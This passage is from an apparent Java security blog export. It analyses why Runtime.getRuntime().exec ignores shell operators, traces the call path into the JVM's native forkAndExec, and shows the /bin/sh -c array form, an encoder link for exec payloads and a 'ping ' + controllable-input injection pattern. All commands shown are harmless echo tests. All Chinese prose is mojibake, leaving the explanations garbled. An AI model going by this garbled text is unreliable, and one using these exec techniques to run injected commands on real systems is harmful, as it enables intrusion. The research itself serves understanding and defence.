class="line">            in = <span class="keyword">new</span> FileInputStream(path);</span><br><span class="line">            out = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">            <span class="keyword">byte</span>[] buffer = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">2048</span>];</span><br><span class="line">            <span class="keyword">int</span> len = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">while</span> ((len = in.read(buffer)) != -<span class="number">1</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                out.write(buffer, <span class="number">0</span>, len);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> out.toByteArray();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> (FileNotFoundException e)</span><br><span class="line">        &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">finally</span></span><br><span class="line">        &#123;</span><br><span class="line">            in.close();</span><br><span class="line">            out.close();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2><p><a href="https://kingx.me/Exploit-FastJson-Without-Reverse-Connect.html">JavaåŠ¨æ€ç±»åŠ è½½ï¼Œå½“FastJsoné‡åˆ°å†…ç½‘</a><br><a href="https://benjaminwhx.com/2018/08/26/Idea%E4%B8%AD%E9%82%A3%E4%BA%9B%E9%B2%9C%E4%B8%BA%E4%BA%BA%E7%9F%A5%E7%9A%84%E8%B0%83%E8%AF%95%E6%8A%80%E5%B7%A7/">Ideaä¸­é‚£äº›é²œä¸ºäººçŸ¥çš„è°ƒè¯•æŠ€å·§</a><br><a href="https://cloud.tencent.com/developer/article/1149445">Javaè™šæ‹Ÿæœºâ€“ç±»åŠ è½½å™¨æºç </a></p>
]]></content>
      <categories>
        <category>web security</category>
      </categories>
      <tags>
        <tag>java</tag>
      </tags>
  </entry>
  <entry>
    <title>Java Runtime.getRuntime().execç”±è¡¨åŠé‡Œ</title>
    <url>/2020/01/11/Java-Runtime-getRuntime-exec%E7%94%B1%E8%A1%A8%E5%8F%8A%E9%87%8C/</url>
    <content><![CDATA[<!-- è¿™ç¯‡æ–‡ç« ä¸»è¦ç›®çš„åœ¨äºå­¦ä¹ å‰äººæ–‡ç« ï¼Œå¹¶ä»æ›´æ·±å…¥ä¸€ç‚¹çš„è§’åº¦æ¢è®¨ä¸ºä»€ä¹ˆRuntime.getRuntime().execæŸäº›æ—¶å€™ä¼šå¤±æ•ˆè¿™ä¸ªé—®é¢˜ã€‚ -->
<!-- more -->

<p>æœ¬æ–‡å‘åœ¨<a href="https://xz.aliyun.com/t/7046">å…ˆçŸ¥ç¤¾åŒº</a>ï¼Œè½¬è½½åˆ°è‡ªå·±åšå®¢ä¸Šã€‚</p>
<h2 id="é—®é¢˜å¤ç°"><a href="#é—®é¢˜å¤ç°" class="headerlink" title="é—®é¢˜å¤ç°"></a>é—®é¢˜å¤ç°</h2><p>æµ‹è¯•ä»£ç å¦‚ä¸‹</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">linux_cmd1</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        String cmd = <span class="string">"cmd which you want to exec"</span>;</span><br><span class="line">        InputStream in = Runtime.getRuntime().exec(cmd).getInputStream();</span><br><span class="line"></span><br><span class="line">        ByteArrayOutputStream baos = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        <span class="keyword">byte</span>[] b = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">1024</span>];</span><br><span class="line">        <span class="keyword">int</span> a = -<span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> ((a = in.read(b)) != -<span class="number">1</span>) &#123;</span><br><span class="line">            baos.write(b, <span class="number">0</span>, a);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="keyword">new</span> String(baos.toByteArray()));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å…ˆçœ‹çœ‹å¯ä»¥æˆåŠŸçš„æƒ…å†µ<br><img src="1577676465197-1f34563e-7443-4f6c-9238-c0137558519e.png#align=left&display=inline&height=232&name=image.png&originHeight=464&originWidth=2472&size=112349&status=done&style=none&width=1236" alt="image.png"></p>
<p>å†æ¥çœ‹çœ‹ä¸èƒ½æˆåŠŸçš„æƒ…å†µ<br><img src="1577676563293-bef3ec10-84d5-4aa5-95b7-bec57b95d23e.png#align=left&display=inline&height=160&name=image.png&originHeight=320&originWidth=2354&size=88578&status=done&style=none&width=1177" alt="image.png"></p>
<p>è¿™é‡Œ <code>&amp;&amp;</code> å¹¶æ²¡æœ‰è¾¾åˆ°bashä¸­çš„æ•ˆæœ<br><img src="1577676687805-0c7e43fb-9d1d-4aa8-8ef6-7331003c1499.png#align=left&display=inline&height=82&name=image.png&originHeight=122&originWidth=1110&size=51524&status=done&style=none&width=746" alt="image.png"></p>
<p>å¦‚æœä»¥å‰æœ‰äººé—®æˆ‘ä¸ºä»€ä¹ˆä¼šå‡ºç°è¿™ç§ï¼Œæˆ‘ä¼šæ¯«ä¸çŠ¹è±«çš„å›ç­”ï¼š<em>å› ä¸º <code>Runtime.getRuntime().exec</code>   æ‰§è¡Œå‘½ä»¤çš„æ—¶å€™å¹¶æ²¡æœ‰shellä¸Šä¸‹æ–‡ç¯å¢ƒæ‰€ä»¥æ— æ³•æŠŠç±»ä¼¼äº <code>&amp;</code> <code>|</code> è¿™æ ·çš„ç¬¦å·è¿›è¡Œç‰¹æ®Šå¤„ç†ã€‚</em></p>
<h2 id="è§£å†³æ–¹æ³•"><a href="#è§£å†³æ–¹æ³•" class="headerlink" title="è§£å†³æ–¹æ³•"></a>è§£å†³æ–¹æ³•</h2><p>è§£å†³è¿™ç§é—®é¢˜çš„æ–¹æ³•æœ‰ä¸¤ç§<br>ç¬¬ä¸€ç§å°±æ˜¯å¯¹æ‰§è¡Œå‘½ä»¤è¿›è¡Œç¼–ç ï¼Œ<a href="http://www.jackson-t.ca/runtime-exec-payloads.html">ç¼–ç åœ°å€åœ¨è¿™</a></p>
<p><img src="1577679919272-65599375-f5c5-4dd0-99fb-eae32d71c6fe.png#align=left&display=inline&height=378&name=image.png&originHeight=646&originWidth=1274&size=50358&status=done&style=none&width=746" alt="image.png"><br><img src="1577679973496-15f40fac-cdbc-48c5-a23c-63385bf3775e.png#align=left&display=inline&height=162&name=image.png&originHeight=324&originWidth=3298&size=104504&status=done&style=none&width=1649" alt="image.png"></p>
<p>ç¬¬äºŒç§å°±æ˜¯ä½¿ç”¨æ•°ç»„çš„å½¢å¼å‘½ä»¤æ‰§è¡Œ</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">String[] command = &#123; <span class="string">"/bin/sh"</span>, <span class="string">"-c"</span>, <span class="string">"echo 2333 2333 2333 &amp;&amp; echo 2333 2333 2333"</span> &#125;;</span><br><span class="line">InputStream in = Runtime.getRuntime().exec(command).getInputStream();</span><br></pre></td></tr></table></figure>

<p><img src="1577680147954-a2e442b8-dd8c-42c4-a578-41d879554491.png#align=left&display=inline&height=229&name=image.png&originHeight=458&originWidth=2918&size=146723&status=done&style=none&width=1459" alt="image.png"></p>
<p>è‡³æ­¤ä»å®æˆ˜åº”ç”¨çš„è§’åº¦è¿™ä¸ªé—®é¢˜å·²ç»è§£å†³äº†ã€‚</p>
<p>ä¸è¿‡æˆ‘ä»¬å¯ä»¥çœ‹åˆ°å…¶å®è¿™ç¬¬äºŒç§æ–¹æ³•ç”¨åˆ°äº† <code>&amp;</code> ä¸Šé¢ _Runtime.getRuntime().execæ‰§è¡Œå‘½ä»¤çš„æ—¶å€™å¹¶æ²¡æœ‰shellä¸Šä¸‹æ–‡ç¯å¢ƒæ‰€ä»¥æ— æ³•æŠŠç±»ä¼¼äº <code>&amp;</code> <code>|</code> <em>`</em><code>_</code> _è¿™æ ·çš„ç¬¦å·ç‰¹æ®Šå¤„ç†ã€‚_è¿™ä¸€ç»“è®ºä¼¼ä¹çœ‹èµ·æ¥å¹¶ç«™ä¸ä½è„š?</p>
<p>ä¸‹é¢æ¥è·Ÿè¸ªä¸€ä¸‹æºç ï¼Œçœ‹çœ‹åˆ°åº•å‘ç”Ÿäº†ä»€ä¹ˆã€‚</p>
<h2 id="æºç åˆ†æ"><a href="#æºç åˆ†æ" class="headerlink" title="æºç åˆ†æ"></a>æºç åˆ†æ</h2><h3 id="å½“ä¼ å…¥Runtime-getRuntime-execçš„æ˜¯å­—ç¬¦ä¸²"><a href="#å½“ä¼ å…¥Runtime-getRuntime-execçš„æ˜¯å­—ç¬¦ä¸²" class="headerlink" title="å½“ä¼ å…¥Runtime.getRuntime().execçš„æ˜¯å­—ç¬¦ä¸²"></a>å½“ä¼ å…¥Runtime.getRuntime().execçš„æ˜¯å­—ç¬¦ä¸²</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">linux_cmd1</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        String cmd = <span class="string">"echo 2333 &amp;&amp; echo 2333"</span>;</span><br><span class="line">        InputStream in = Runtime.getRuntime().exec(cmd).getInputStream();</span><br><span class="line"></span><br><span class="line">        ByteArrayOutputStream baos = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        <span class="keyword">byte</span>[] b = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">1024</span>];</span><br><span class="line">        <span class="keyword">int</span> a = -<span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> ((a = in.read(b)) != -<span class="number">1</span>) &#123;</span><br><span class="line">            baos.write(b, <span class="number">0</span>, a);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="keyword">new</span> String(baos.toByteArray()));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å› ä¸ºä¼ å…¥çš„å‘½ä»¤æ˜¯Stringç±»å‹ï¼Œæ‰€ä»¥è¿›å…¥ <code>java.lang.Runtime#exec(java.lang.String, java.lang.String[], java.io.File)</code>  ã€‚<strong>è¿™é‡Œæ˜¯ç¬¬ä¸€ä¸ªéå¸¸å…³é”®çš„ç‚¹ï¼Œ <code>StringTokenizer</code> ä¼šæŠŠä¼ å…¥çš„conmmandå­—ç¬¦ä¸²æŒ‰ <code>\t \n \r \f</code> ä¸­çš„ä»»æ„ä¸€ä¸ªåˆ†å‰²æˆæ•°ç»„cmdarrayã€‚</strong></p>
<p><img src="1577685833249-067f99be-c43e-4564-a18f-a47a6856861a.png#align=left&display=inline&height=211&name=image.png&originHeight=422&originWidth=2766&size=176007&status=done&style=none&width=1383" alt="image.png"><br><img src="1577686182902-31dc960d-5d35-42a5-8803-079771cf19b3.png#align=left&display=inline&height=186&name=image.png&originHeight=228&originWidth=916&size=22796&status=done&style=none&width=746" alt="image.png"></p>
<p>ä»£ç æ¥åˆ°execçš„å¤šæ€å®ç° <code>java.lang.Runtime#exec(java.lang.String[], java.lang.String[], java.io.File)</code> ï¼Œexecå†…éƒ¨è°ƒç”¨äº†ProcessBuilderçš„startã€‚<br><img src="1577686458188-5644d174-4a9f-4a06-a666-eb66296ce4d5.png#align=left&display=inline&height=130&name=image.png&originHeight=260&originWidth=1816&size=61763&status=done&style=none&width=908" alt="image.png"></p>
<p>ProcessBuilder.startå†…éƒ¨åˆè°ƒç”¨äº†ProcessImpl.startã€‚<br><img src="1577686661547-d787e724-269b-4a25-95c6-1a87412d7e97.png#align=left&display=inline&height=127&name=image.png&originHeight=254&originWidth=2602&size=71237&status=done&style=none&width=1301" alt="image.png"></p>
<p>åœ¨ProcessImpl.startä¸­æœ‰<strong>ç¬¬äºŒä¸ªéå¸¸å…³é”®çš„ç‚¹æˆ‘ä»¬å¯ä»¥çœ‹åˆ°ç¨‹åºæŠŠcmdarrayç¬¬ä¸€ä¸ªå‚æ•°ï¼ˆcmdarray[0]ï¼‰å½“æˆè¦æ‰§è¡Œçš„å‘½ä»¤ï¼ŒæŠŠå…¶åçš„éƒ¨åˆ†ï¼ˆcmdarray[1:]ï¼‰ä½œä¸ºå‘½ä»¤çš„å‚æ•°è½¬æ¢æˆbyte æ•°ç»„ argBlockï¼ˆå…·ä½“è§„åˆ™æ˜¯ä»¥\x00è¿›è¡Œimplodeï¼‰ã€‚</strong><br><img src="1577687523856-aadd2b68-7973-4b49-a857-d554004c8f6e.png#align=left&display=inline&height=487&name=image.png&originHeight=974&originWidth=2514&size=281837&status=done&style=none&width=1257" alt="image.png"></p>
<p>ProcessImpl.startæœ€ååˆä¼šæŠŠå¤„ç†å¥½çš„å‚æ•°ä¼ å…¥UNIXProcess<br><img src="1577686887031-96670a59-cdca-4cf1-ad79-ee82474a18bb.png#align=left&display=inline&height=156&name=image.png&originHeight=312&originWidth=2602&size=86125&status=done&style=none&width=1301" alt="image.png"></p>
<p>UNIXProcesså†…éƒ¨åˆè°ƒç”¨äº†forkAndExecæ–¹æ³•<br><img src="1577688234642-21446af8-71dc-42ef-a9a4-d4f549399445.png#align=left&display=inline&height=312&name=image.png&originHeight=624&originWidth=2776&size=186773&status=done&style=none&width=1388" alt="image.png"></p>
<p>è¿™é‡Œçš„æ˜¯forkAndExecæ˜¯ä¸€ä¸ªnativeæ–¹æ³•ã€‚<br><img src="1577686970789-da810849-80d9-4eb2-b107-7bb1ce933b0f.png#align=left&display=inline&height=155&name=image.png&originHeight=310&originWidth=1994&size=74399&status=done&style=none&width=997" alt="image.png"></p>
<p>ä»å˜é‡çš„å‘½åæ¥çœ‹ï¼Œåœ¨å¼€å‘è€…çš„çœ¼ä¸­progæ˜¯è¦æ‰§è¡Œçš„å‘½ä»¤å³ <code>echo</code> ï¼ŒargBlockéƒ½æ˜¯ä¼ ç»™ <code>echo</code> çš„å‚æ•°å³<code>2333\x00&amp;&amp;\x002333</code>ä¸”ä¼ ç»™ <code>echo</code> çš„å‚æ•°ä¸ªæ•°argcæ˜¯4<br>å¯è§ç»è¿‡StringTokenizerå¯¹å­—ç¬¦ä¸²ä¸­ç©ºæ ¼ç±»çš„å¤„ç†å…¶å®æ˜¯ä¸€ç§javaå¯¹å‘½ä»¤æ‰§è¡Œçš„ä¿æŠ¤æœºåˆ¶ï¼Œä»–å¯ä»¥é˜²å¾¡ä»¥ä¸‹è¿™ç§å‘½ä»¤æ³¨å…¥ã€‚</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">String cmd = <span class="string">"ping "</span> + å¯æ§ç‚¹;</span><br><span class="line">Runtime.getRuntime().exec(cmd)</span><br></pre></td></tr></table></figure>

<p>è¡¥ä¸€ä¸ªå®Œæ•´çš„è°ƒç”¨æ ˆã€‚<img src="1577687207316-a29ab55a-281b-4cd5-b8df-d35c5038dbb5.png#align=left&display=inline&height=200&name=image.png&originHeight=288&originWidth=1076&size=49512&status=done&style=none&width=746" alt="image.png"></p>
<h3 id="å½“ä¼ å…¥Runtime-getRuntime-execçš„æ˜¯å­—ç¬¦ä¸²æ•°ç»„"><a href="#å½“ä¼ å…¥Runtime-getRuntime-execçš„æ˜¯å­—ç¬¦ä¸²æ•°ç»„" class="headerlink" title="å½“ä¼ å…¥Runtime.getRuntime().execçš„æ˜¯å­—ç¬¦ä¸²æ•°ç»„"></a>å½“ä¼ å…¥Runtime.getRuntime().execçš„æ˜¯å­—ç¬¦ä¸²æ•°ç»„</h3><p>æˆ‘ä»¬å†æ¥çœ‹çœ‹ç»™Runtimeä¼ å…¥æ•°ç»„çš„æ—¶å€™æ˜¯ä»€ä¹ˆæƒ…å†µã€‚</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">linux_cmd1</span> &#123;</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> throws IOException </span>&#123;</span><br><span class="line">        String[] command = &#123; <span class="string">"/bin/sh"</span>, <span class="string">"-c"</span>, <span class="string">"echo 2333 &amp;&amp; echo 2333"</span> &#125;;</span><br><span class="line">        InputStream in = Runtime.getRuntime().exec(command).getInputStream();</span><br><span class="line"></span><br><span class="line">        ByteArrayOutputStream baos = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        byte[] b = <span class="keyword">new</span> byte[<span class="number">1024</span>];</span><br><span class="line">        <span class="keyword">int</span> a = <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> ((a = in.read(b)) != <span class="number">-1</span>) &#123;</span><br><span class="line">            baos.write(b, <span class="number">0</span>, a);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="keyword">new</span> String(baos.toByteArray()));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å› ä¸ºè¿™é‡Œä¼ å…¥çš„æ•°ç»„ï¼Œæ‰€ä»¥å¹¶æ²¡æœ‰ç»StringTokenizerå¯¹å­—ç¬¦ä¸²çš„åˆ†å‰²å¤„ç†è¿™ä¸€æ­¥è€Œæ˜¯ç›´æ¥è¿›å…¥äº†ã€‚<code>java.lang.Runtime#exec(java.lang.String[])</code> ã€‚<br><img src="1577689013179-27759f7d-39b7-453c-883c-674de2de614d.png#align=left&display=inline&height=75&name=image.png&originHeight=150&originWidth=2222&size=51052&status=done&style=none&width=1111" alt="image.png"></p>
<p>åé¢çš„æµç¨‹å’Œå­—ç¬¦ä¸²çš„æƒ…å½¢æ˜¯ä¸€è‡´çš„ï¼Œæœ€åæ¥åˆ°forkAndExec<br><img src="1577689204761-132deaef-3c15-4894-8d8f-bc307ff0de8e.png#align=left&display=inline&height=318&name=image.png&originHeight=636&originWidth=2828&size=191238&status=done&style=none&width=1414" alt="image.png"></p>
<p>æŒ‰ç…§ä¸Šé¢çš„è¯´æ³•è¿™é‡Œ <code>/bin/bash</code> æ˜¯è¦æ‰§è¡Œçš„å‘½ä»¤ï¼Œ <code>-c\x00&quot;echo 2333 &amp;&amp; echo 23333&quot;</code> æ˜¯ä¼ ç»™çš„ <code>/bin/bash</code> çš„å‚æ•°ã€‚</p>
<p>è¡¥ä¸€ä¸ªè°ƒç”¨æ ˆ<br><img src="1577891037047-1a96c772-57d2-4476-93b4-3460b8ea60b1.png#align=left&display=inline&height=129&name=image.png&originHeight=258&originWidth=1074&size=43587&status=done&style=none&width=537" alt="image.png"></p>
<h3 id="ä¸€ä¸ªé”™è¯¯çš„æƒ³æ³•"><a href="#ä¸€ä¸ªé”™è¯¯çš„æƒ³æ³•" class="headerlink" title="ä¸€ä¸ªé”™è¯¯çš„æƒ³æ³•"></a>ä¸€ä¸ªé”™è¯¯çš„æƒ³æ³•</h3><p>çœ‹åˆ°è¿™é‡Œä¸çŸ¥é“ä½ æ˜¯ä¸æ˜¯æœ‰ç‚¹æ™•ï¼Œå¿ƒåº•ç”Ÿå‡ºäº†ç–‘é—®ï¼Œåœ¨æ‰§è¡Œå­—ç¬¦ä¸²çš„æ—¶å€™åŠ ä¸Š <code>/bin/bash</code> ä¸å°±å¥½äº†ã€‚åƒä¸‹é¢è¿™æ ·ã€‚</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">linux_cmd1</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        String cmd = <span class="string">"/bin/bash -c 'echo 2333 &amp;&amp; echo 2333'"</span>;</span><br><span class="line">        InputStream in = Runtime.getRuntime().exec(cmd).getInputStream();</span><br><span class="line">        ByteArrayOutputStream baos = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        <span class="keyword">byte</span>[] b = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">1024</span>];</span><br><span class="line">        <span class="keyword">int</span> a = -<span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> ((a = in.read(b)) != -<span class="number">1</span>) &#123;</span><br><span class="line">            baos.write(b, <span class="number">0</span>, a);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="keyword">new</span> String(baos.toByteArray()));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>è¿è¡Œè¯•è¯•çœ‹ï¼Œå‘ç°ä»€ä¹ˆç»“æœéƒ½æ²¡æœ‰ï¼Œæ¨æµ‹åº”è¯¥æ˜¯shellæ‰§è¡Œå‘½ä»¤å¤±è´¥äº†ã€‚<br><img src="1577690492437-eb933d61-d2b5-4175-94e8-2707f0a04a80.png#align=left&display=inline&height=302&name=image.png&originHeight=604&originWidth=2076&size=124786&status=done&style=none&width=1038" alt="image.png"></p>
<p>ä¸ºä»€ä¹ˆä¼šå¤±è´¥å‘¢ï¼Ÿæˆ‘ä»¬æ¥diffä¸€ä¸‹å’Œæ•°ç»„æ‰§è¡Œæœ€åè¿›nativeçš„å±‚çš„åŒºåˆ«ã€‚<br><img src="1577695145401-bada57bf-0499-4f8c-b33f-1d240cd142af.png#align=left&display=inline&height=774&name=image.png&originHeight=1548&originWidth=2786&size=270657&status=done&style=none&width=1393" alt="image.png"><br>å¯ä»¥çœ‹åˆ°progéƒ½æ˜¯ <code>/bin/bash</code> ä½†æ˜¯å­—ç¬¦ä¸²æ¨¡å¼ä¸‹æ‰§è¡Œçš„å‚æ•°å˜æˆäº† <code>-c\x00&#39;echo\x002333\x00&amp;&amp;\x00echo\x002333&#39;</code> ï¼Œå¯¹æ¯”æ•°ç»„æ¨¡å¼ <code>-c\x00&quot;echo 2333 &amp;&amp; echo 23333&quot;</code> ã€‚å¯ä»¥å‘ç°å­—ç¬¦ä¸²æ¨¡å¼ä¸‹å› ä¸º<code>StringTokenizer</code>å¯¹å­—ç¬¦ä¸²ç©ºæ ¼ç±»å­—ç¬¦çš„å¤„ç†<strong>ç ´åäº†å‘½ä»¤æ‰§è¡Œçš„è¯­ä¹‰</strong>ã€‚</p>
<p>å¦‚æœå†ä»”ç»†çœ‹çœ‹ä¼šå‘ç°å­—ç¬¦ä¸²æ¨¡å¼argcä¸º6è€Œæ•°ç»„æ¨¡å¼åªæœ‰2ã€‚å†™åˆ°è¿™é‡Œå…¶å®æˆ‘è¿˜æƒ³é’»ä»¥ä¸‹ç‰›è§’å°–ï¼Œå‡­ä»€ä¹ˆ6ä¸ªå‚æ•°æœ€åå°±ä¸èƒ½æ‰§è¡Œï¼Ÿ</p>
<h3 id="è¿›å…¥jvmçœ‹çœ‹"><a href="#è¿›å…¥jvmçœ‹çœ‹" class="headerlink" title="è¿›å…¥jvmçœ‹çœ‹"></a>è¿›å…¥jvmçœ‹çœ‹</h3><p>å¸¦ç€è¿™æ ·çš„ç–‘é—®ï¼Œæˆ‘è‡ªä¸é‡åŠ›çš„ç¼–è¯‘äº†javaæºç å¹¶ç°å­¦äº†ä¸€ä¸‹æ€ä¹ˆè°ƒè¯•jvmï¼ˆè°ƒè¯•çš„ç¯å¢ƒæ˜¯ubuntu14.04+jdk8ï¼‰ä¸‹é¢æ˜¯å­¦ä¹ æˆæœã€‚</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        String[] command = &#123; <span class="string">"/bin/bash"</span>, <span class="string">"-c"</span>, <span class="string">"echo 2333 &amp;&amp; echo 2333"</span> &#125;;</span><br><span class="line">        InputStream in = Runtime.getRuntime().exec(command).getInputStream();</span><br><span class="line"></span><br><span class="line">        ByteArrayOutputStream baos = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        <span class="keyword">byte</span>[] b = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">1024</span>];</span><br><span class="line">        <span class="keyword">int</span> a = -<span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> ((a = in.read(b)) != -<span class="number">1</span>) &#123;</span><br><span class="line">            baos.write(b, <span class="number">0</span>, a);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="keyword">new</span> String(baos.toByteArray()));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>æ ¹æ®java nativeå‡½æ•°å‘½åè§„åˆ™å¯ä»¥çŸ¥é“forkAndExecå¯¹åº”çš„cå‡½æ•°æ˜¯ <code>Java_java_lang_UNIXProcess_forkAndExec</code>  ã€‚<br><img src="1577891334880-c3954fc0-353f-4e3a-93d2-c05a22a1805b.png#align=left&display=inline&height=762&name=image.png&originHeight=1524&originWidth=1826&size=284743&status=done&style=none&width=913" alt="image.png"></p>
<p>è¿™ä¸ªå‡½æ•°åˆå§‹åŒ–æ‰§è¡Œå‘½ä»¤æ‰€éœ€è¦ä¸€äº›å˜é‡ï¼ˆå¦‚è¾“å…¥è¾“å‡ºé”™è¯¯æµï¼‰ä»¥åŠæå–å¹¶å¤„ç†javaä¼ å…¥è¿›æ¥çš„å‚æ•°ï¼Œæœ€åè°ƒç”¨startChildå‡½æ•°å¼€å¯å­è¿›ç¨‹ã€‚</p>
<p><img src="1577803126319-c17c1625-54d4-4a06-b2f4-f3e2d69f0912.png#align=left&display=inline&height=738&name=image.png&originHeight=1476&originWidth=2068&size=1476544&status=done&style=none&width=1034" alt="image.png"></p>
<p>startChildä¼šæ ¹æ®æ˜¯modeçš„æ•°å€¼ä¸åŒè¿›å…¥ä¸åŒçš„åˆ†æ”¯ï¼Œmodeç”±æ“ä½œç³»ç»Ÿã€libcç‰ˆæœ¬å†³å®šã€‚<br><img src="1577891592795-27719e34-85b1-49fb-94b9-6fbbb4bd7a4b.png#align=left&display=inline&height=640&name=image.png&originHeight=1280&originWidth=1956&size=187639&status=done&style=none&width=978" alt="image.png"></p>
<p>æˆ‘è¿™é‡Œè¿›å…¥äº†vforkChildï¼ŒvforkChildä¼šä½¿ç”¨vforkå¼€å¯ä¸€ä¸ªå­è¿›ç¨‹ï¼Œå¹¶ä¸”åœ¨å­è¿›ç¨‹å†…éƒ¨è°ƒç”¨äº†childProcessï¼Œåœ¨clionä¸­ä¸ºäº†è°ƒè¯•è¿›å…¥å­è¿›ç¨‹éœ€è¦åœ¨è¿›å…¥ä¹‹å‰åœ¨gdbè°ƒè¯•æ¡†è¾“å…¥ <code>set follow-fork-mode child</code>  å’Œ <code>set detach-on-fork off</code><br><img src="1577886759874-01492158-3589-42ae-8468-8ba3629cc2bc.png#align=left&display=inline&height=744&name=image.png&originHeight=1488&originWidth=1922&size=234923&status=done&style=none&width=961" alt="image.png"></p>
<p>childProcessä¸­è°ƒç”¨JDK_execvpeã€‚<br><img src="1577892301729-741292b7-cee1-4ed8-9ce9-72fec7fc5783.png#align=left&display=inline&height=685&name=image.png&originHeight=1370&originWidth=1596&size=183821&status=done&style=none&width=798" alt="image.png"><br>JDK_execvpeæœ€åè°ƒç”¨ç³»ç»Ÿexecvpå‡½æ•°ï¼Œæˆ‘ä»¬æ¥ç»†ä¸€çœ‹ä¼ å‚æƒ…å†µã€‚</p>
<p><img src="1577886891144-925b1102-3c6f-4752-b0ba-b5b94d1def00.png#align=left&display=inline&height=452&name=image.png&originHeight=904&originWidth=1838&size=123585&status=done&style=none&width=919" alt="image.png"></p>
<p><img src="1577887135995-42990dc8-ec02-401e-9213-eddf7e418801.png#align=left&display=inline&height=213&name=image.png&originHeight=356&originWidth=1246&size=39821&status=done&style=none&width=746" alt="image.png"></p>
